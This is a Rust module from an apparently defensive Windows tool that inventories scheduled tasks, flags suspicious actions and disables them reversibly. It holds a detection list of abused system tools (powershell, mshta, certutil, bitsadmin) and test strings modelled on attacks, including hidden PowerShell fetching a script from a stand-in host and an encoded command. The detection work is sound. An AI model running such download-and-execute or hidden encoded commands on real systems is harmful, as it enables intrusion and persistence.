//! Scheduled Tasks watch: part of Persistence Watch.
//!
//! Every registered task has an XML definition under `%SystemRoot%\System32\Tasks`
//! (readable by LocalSystem). We read the `<Exec>` actions from those files, so a
//! new or changed task shows up in the persistence baseline like a Run key does,
//! and the program (or script) it launches is scanned.
//!
//! Clean-up disables a task (reversible) rather than deleting it.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// Baseline key prefix: `TASK|\Folder\Name`.
pub const KEY_PREFIX: &str = "TASK|";

#[cfg_attr(not(windows), allow(dead_code))]
pub fn tasks_dir() -> PathBuf {
    let root = std::env::var_os("SystemRoot").unwrap_or_else(|| r"C:\Windows".into());
    PathBuf::from(root).join(r"System32\Tasks")
}

/// Add `TASK|\path\name` -> actions for every task definition under `dir`.
pub fn collect(dir: &Path, map: &mut HashMap<String, String>) {
    let mut stack = vec![dir.to_path_buf()];
    let mut seen = 0usize;
    while let Some(d) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&d) else { continue };
        for e in entries.flatten() {
            let Ok(ft) = e.file_type() else { continue };
            let p = e.path();
            if ft.is_dir() {
                stack.push(p);
                continue;
            }
            seen += 1;
            if seen > 5000 {
                return; // defensive bound; a normal PC has a few hundred
            }
            let Ok(meta) = e.metadata() else { continue };
            if meta.len() > 1024 * 1024 {
                continue;
            }
            let Ok(bytes) = std::fs::read(&p) else { continue };
            let Some(xml) = decode(&bytes) else { continue };
            let Ok(rel) = p.strip_prefix(dir) else { continue };
            let name = format!(r"\{}", rel.to_string_lossy().replace('/', r"\"));
            map.insert(format!("{KEY_PREFIX}{name}"), actions(&xml).join(" ; "));
        }
    }
}

/// Task files are UTF-16LE with a BOM; tolerate UTF-8 too.
fn decode(bytes: &[u8]) -> Option<String> {
    if let Some(rest) = bytes.strip_prefix(&[0xFF, 0xFE]) {
        let (units, _) = rest.as_chunks::<2>();
        let u16s: Vec<u16> = units.iter().map(|c| u16::from_le_bytes(*c)).collect();
        return Some(String::from_utf16_lossy(&u16s));
    }
    let s = bytes.strip_prefix(&[0xEF, 0xBB, 0xBF]).unwrap_or(bytes);
    let s = String::from_utf8_lossy(s).into_owned();
    s.contains("<Task").then_some(s)
}

/// Text between `<tag>` (or `<tag attr…>`) and `</tag>`, starting at `from`.
fn element<'a>(xml: &'a str, tag: &str, from: usize) -> Option<(&'a str, usize)> {
    let open = format!("<{tag}");
    let mut i = from;
    loop {
        let start = i + xml.get(i..)?.find(&open)?;
        let after = start + open.len();
        // `<Command>` must not match `<CommandLine>`.
        let next = xml[after..].chars().next()?;
        if next == '>' || next.is_whitespace() {
            let body_start = after + xml[after..].find('>')? + 1;
            if xml[..body_start].ends_with("/>") {
                return Some(("", body_start));
            }
            let close = format!("</{tag}>");
            let end = body_start + xml[body_start..].find(&close)?;
            return Some((&xml[body_start..end], end + close.len()));
        }
        i = after;
    }
}

fn unescape(s: &str) -> String {
    s.trim()
        .replace("&quot;", "\"")
        .replace("&apos;", "'")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&amp;", "&")
}

/// Each action as a command line: `<Exec>` → `command args`, `<ComHandler>` → `COM handler {CLSID}`.
pub fn actions(xml: &str) -> Vec<String> {
    let mut out = Vec::new();
    let Some((body, _)) = element(xml, "Actions", 0) else {
        return out;
    };
    let mut i = 0;
    while let Some((exec, next)) = element(body, "Exec", i) {
        i = next;
        let Some((cmd, _)) = element(exec, "Command", 0) else { continue };
        let cmd = unescape(cmd);
        let args = element(exec, "Arguments", 0).map(|(a, _)| unescape(a)).unwrap_or_default();
        // Quote the command so extract_executable() finds it even with spaces.
        let quoted = if cmd.starts_with('"') { cmd } else { format!("\"{cmd}\"") };
        out.push(if args.is_empty() { quoted } else { format!("{quoted} {args}") });
    }
    let mut i = 0;
    while let Some((com, next)) = element(body, "ComHandler", i) {
        i = next;
        if let Some((clsid, _)) = element(com, "ClassId", 0) {
            out.push(format!("COM handler {}", unescape(clsid)));
        }
    }
    out
}

const SCRIPT_HOSTS: &[&str] = &[
    "powershell.exe",
    "pwsh.exe",
    "cmd.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "msiexec.exe",
    "bitsadmin.exe",
    "certutil.exe",
    "curl.exe",
];

fn lower(s: &str) -> String {
    s.to_ascii_lowercase().replace('/', "\\")
}

fn user_writable(s: &str) -> bool {
    let s = lower(s);
    [
        "\\appdata\\",
        "\\temp\\",
        "\\downloads\\",
        "\\users\\public\\",
        "\\programdata\\",
        "%temp%",
        "%appdata%",
        "%localappdata%",
    ]
    .iter()
    .any(|f| s.contains(f))
}

fn exe_name(action: &str) -> String {
    super::persistence::extract_executable(action)
        .map(|p| lower(&p.to_string_lossy()).rsplit('\\').next().unwrap_or_default().to_string())
        .unwrap_or_default()
}

/// Red flags in one action, for the alert text and severity.
pub fn red_flags(action: &str) -> Vec<&'static str> {
    let mut v = Vec::new();
    let name = exe_name(action);
    let l = lower(action);
    if SCRIPT_HOSTS.contains(&name.as_str()) {
        v.push("runs a script host / system tool often abused by malware");
    }
    if super::super::heuristics::risky_location(Path::new(&l)).is_some() || user_writable(&l) {
        v.push("launches something from a user-writable folder (AppData, Temp, Downloads, ProgramData)");
    }
    if l.contains(" -enc") || l.contains(" -e ") || l.contains("frombase64string") || l.contains("-windowstyle hidden")
    {
        v.push("hidden or encoded PowerShell");
    }
    let raw = action.to_ascii_lowercase();
    if raw.contains("http://") || raw.contains("https://") {
        v.push("downloads from the internet");
    }
    v
}

/// Built-in Windows tasks change with every update. Stay quiet about tasks under
/// `\Microsoft\` that run a system binary with nothing suspicious in the action.
pub fn is_routine(name: &str, value: &str) -> bool {
    if !lower(name).starts_with("\\microsoft\\") {
        return false;
    }
    value.split(" ; ").all(|action| {
        if action.starts_with("COM handler") || action.is_empty() {
            return true;
        }
        let exe = super::persistence::extract_executable(action)
            .map(|p| lower(&p.to_string_lossy()))
            .unwrap_or_default();
        let system = exe.starts_with("%windir%")
            || exe.starts_with("%systemroot%")
            || exe.contains(":\\windows\\")
            || exe.contains(":\\program files")
            || !exe.contains('\\'); // bare name resolved from System32
        system && !user_writable(action) && red_flags(action).iter().all(|f| f.starts_with("runs a script host"))
    })
}

/// Files a task action launches: the executable, plus a script or DLL named in its arguments.
pub fn targets(value: &str) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for action in value.split(" ; ") {
        if let Some(p) = super::persistence::extract_executable(action) {
            out.push(p);
        }
        out.extend(script_args(action));
    }
    out.retain(|p| p.is_file());
    out.dedup();
    out
}

/// Paths with a script / library extension in a command line's arguments.
fn script_args(action: &str) -> Vec<PathBuf> {
    // Skip the (quoted) command itself: only its arguments are of interest here.
    let action = match action.strip_prefix('"').and_then(|r| r.find('"').map(|i| &r[i + 1..])) {
        Some(rest) => rest,
        None => action.split_once(' ').map(|(_, r)| r).unwrap_or(""),
    };
    const EXT: &[&str] = &[
        ".ps1", ".psm1", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".bat", ".cmd", ".hta", ".dll", ".exe", ".scr",
    ];
    let mut out = Vec::new();
    let l = action.to_ascii_lowercase();
    for ext in EXT {
        let mut from = 0;
        while let Some(i) = l[from..].find(ext) {
            let end = from + i + ext.len();
            from = end;
            if l[end..].chars().next().is_some_and(|c| c.is_ascii_alphanumeric()) {
                continue;
            }
            // Walk back to the start of the path: a quote, or a space before a drive letter.
            let head = &action[..end];
            let start = if let Some(q) = head.rfind('"') {
                q + 1
            } else {
                match head.rfind(":\\") {
                    Some(c) if c > 0 => c - 1,
                    _ => continue,
                }
            };
            let path = head[start..].trim();
            if path.len() > 3 && path.as_bytes().get(1) == Some(&b':') {
                out.push(PathBuf::from(path));
            }
        }
    }
    out
}

/// Names of tasks under `dir` whose action launches `target` (or names it as a script).
#[cfg_attr(not(windows), allow(dead_code))]
pub fn tasks_launching(dir: &Path, target: &Path) -> Vec<String> {
    let mut map = HashMap::new();
    collect(dir, &mut map);
    let t = target.to_string_lossy().to_lowercase();
    let mut out: Vec<String> = map
        .into_iter()
        .filter(|(_, v)| {
            v.split(" ; ").any(|a| super::persistence::launches(a, target) || a.to_lowercase().contains(&t))
        })
        .filter_map(|(k, _)| k.strip_prefix(KEY_PREFIX).map(str::to_string))
        .collect();
    out.sort();
    out
}

/// Enable or disable a task through `schtasks` (keeps the definition, so it is reversible).
pub fn set_enabled(name: &str, enabled: bool) -> anyhow::Result<()> {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        let out = std::process::Command::new("schtasks.exe")
            .args(["/Change", "/TN", name, if enabled { "/ENABLE" } else { "/DISABLE" }])
            .creation_flags(CREATE_NO_WINDOW)
            .output()?;
        if !out.status.success() {
            anyhow::bail!(
                "schtasks: {}",
                String::from_utf8_lossy(&out.stderr).trim().trim_start_matches("ERROR: ")
            );
        }
        Ok(())
    }
    #[cfg(not(windows))]
    {
        let _ = (name, enabled);
        anyhow::bail!("scheduled tasks exist only on Windows")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn utf16_file(xml: &str) -> Vec<u8> {
        let mut v = vec![0xFF, 0xFE];
        v.extend(xml.encode_utf16().flat_map(|u| u.to_le_bytes()));
        v
    }

    const XML: &str = r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Settings><Enabled>true</Enabled></Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\bob\AppData\Roaming\upd\svc host.exe</Command>
      <Arguments>-q &quot;C:\Users\bob\AppData\Roaming\upd\run.ps1&quot;</Arguments>
    </Exec>
    <ComHandler><ClassId>{0000-1111}</ClassId></ComHandler>
  </Actions>
</Task>"#;

    #[test]
    fn reads_actions_from_task_files() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("Vendor")).unwrap();
        std::fs::write(dir.path().join("Vendor").join("Updater"), utf16_file(XML)).unwrap();
        let mut map = HashMap::new();
        collect(dir.path(), &mut map);
        let key = format!("{KEY_PREFIX}\\Vendor\\Updater").replace('/', "\\");
        let v = map.get(&key).unwrap_or_else(|| panic!("{map:?}"));
        assert_eq!(
            v,
            r#""C:\Users\bob\AppData\Roaming\upd\svc host.exe" -q "C:\Users\bob\AppData\Roaming\upd\run.ps1" ; COM handler {0000-1111}"#
        );
    }

    #[test]
    fn command_does_not_match_longer_tags() {
        let xml = "<Actions><Exec><CommandLine>x</CommandLine><Command>a.exe</Command></Exec></Actions>";
        assert_eq!(actions(xml), vec!["\"a.exe\"".to_string()]);
    }

    #[test]
    fn finds_scripts_named_in_arguments() {
        let got = script_args(r#""C:\Windows\System32\wscript.exe" //B "C:\Users\bob\AppData\x\a b.vbs""#);
        assert_eq!(got, vec![PathBuf::from(r"C:\Users\bob\AppData\x\a b.vbs")]);
        let got = script_args(r"rundll32.exe C:\ProgramData\evil.dll,Start");
        assert_eq!(got, vec![PathBuf::from(r"C:\ProgramData\evil.dll")]);
    }

    #[test]
    fn routine_windows_tasks_are_quiet_but_abuse_is_not() {
        assert!(is_routine(
            r"\Microsoft\Windows\Defrag\ScheduledDefrag",
            r#""%windir%\system32\defrag.exe" -c -h -o"#
        ));
        assert!(is_routine(r"\Microsoft\Windows\X", "COM handler {1234}"));
        // Hiding in the Microsoft folder does not make an AppData payload routine.
        assert!(!is_routine(
            r"\Microsoft\Windows\Update",
            r#""C:\Users\bob\AppData\Roaming\u.exe""#
        ));
        assert!(!is_routine(
            r"\Microsoft\Windows\Update",
            r#""powershell.exe" -w hidden -enc SQBFAFgA"#
        ));
        assert!(!is_routine(r"\Vendor\Updater", r#""C:\Program Files\Vendor\upd.exe""#));
    }

    #[test]
    fn red_flags_explain_suspicious_actions() {
        let f = red_flags(r#""powershell.exe" -WindowStyle Hidden -Command iwr https://x.example/a.ps1"#);
        assert!(f.iter().any(|s| s.contains("script host")));
        assert!(f.iter().any(|s| s.contains("hidden or encoded")));
        assert!(f.iter().any(|s| s.contains("internet")));
        assert!(red_flags(r#""C:\Program Files\Vendor\upd.exe" /check"#).is_empty());
    }

    #[test]
    fn finds_tasks_that_launch_a_file() {
        let dir = tempfile::tempdir().unwrap();
        let target = PathBuf::from(r"C:\Users\bob\AppData\Roaming\upd\run.ps1");
        std::fs::write(dir.path().join("Updater"), utf16_file(XML)).unwrap();
        std::fs::write(
            dir.path().join("Other"),
            utf16_file("<Task><Actions><Exec><Command>notepad.exe</Command></Exec></Actions></Task>"),
        )
        .unwrap();
        assert_eq!(tasks_launching(dir.path(), &target), vec![r"\Updater".to_string()]);
    }
}
